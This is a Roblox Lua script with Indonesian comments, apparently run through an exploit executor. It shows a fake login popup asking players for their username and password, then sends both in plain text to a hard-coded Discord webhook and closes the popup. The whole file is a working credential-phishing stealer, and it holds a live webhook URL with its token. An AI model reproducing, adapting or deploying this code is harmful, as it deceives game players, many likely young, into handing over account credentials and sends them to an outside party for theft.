-- Fungsi untuk mendeteksi executor
local function detectExecutor()
    if syn and syn.request then
        return "syn"
    elseif http and http.request then
        return "http"
    elseif request then
        return "request"
    else
        return nil
    end
end

-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

local function sendToDiscord(username, password)
    local executor = detectExecutor()
    if not executor then
        print("Executor tidak mendukung HTTP requests!")
        return
    end

    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Login attempt:\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    local response
    if executor == "syn" then
        response = syn.request(payload)
    elseif executor == "http" then
        response = http.request(payload)
    elseif executor == "request" then
        response = request(payload)
    end

    -- Debugging hasil
    if response and response.Success then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord!")
    end
end

-- Membuat GUI
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local usernameBox = Instance.new("TextBox")
local passwordBox = Instance.new("TextBox")
local loginButton = Instance.new("TextButton")

-- Properti ScreenGui
screenGui.Name = "LoginPopup"
screenGui.Parent = game:GetService("CoreGui")

-- Properti Frame
frame.Name = "LoginFrame"
frame.Parent = screenGui
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
frame.BorderSizePixel = 0

-- Properti UsernameBox
usernameBox.Name = "UsernameBox"
usernameBox.Parent = frame
usernameBox.Size = UDim2.new(0, 280, 0, 40)
usernameBox.Position = UDim2.new(0, 10, 0, 20)
usernameBox.PlaceholderText = "Enter Username"
usernameBox.Text = ""
usernameBox.BackgroundColor3 = Color3.new(1, 1, 1)
usernameBox.TextColor3 = Color3.new(0, 0, 0)

-- Properti PasswordBox
passwordBox.Name = "PasswordBox"
passwordBox.Parent = frame
passwordBox.Size = UDim2.new(0, 280, 0, 40)
passwordBox.Position = UDim2.new(0, 10, 0, 80)
passwordBox.PlaceholderText = "Enter Password"
passwordBox.Text = ""
passwordBox.BackgroundColor3 = Color3.new(1, 1, 1)
passwordBox.TextColor3 = Color3.new(0, 0, 0)
passwordBox.TextTransparency = 0.5

-- Properti LoginButton
loginButton.Name = "LoginButton"
loginButton.Parent = frame
loginButton.Size = UDim2.new(0, 280, 0, 40)
loginButton.Position = UDim2.new(0, 10, 0, 140)
loginButton.Text = "Login"
loginButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
loginButton.TextColor3 = Color3.new(1, 1, 1)

-- Fungsi ketika tombol login ditekan
loginButton.MouseButton1Click:Connect(function()
    local username = usernameBox.Text
    local password = passwordBox.Text
    print("Tombol login ditekan!") -- Debugging

    if username ~= "" and password ~= "" then
        print("Username:", username, "Password:", password) -- Debugging input
        sendToDiscord(username, password)
        frame:Destroy()
    else
        print("Username atau password kosong!")
    end
end)
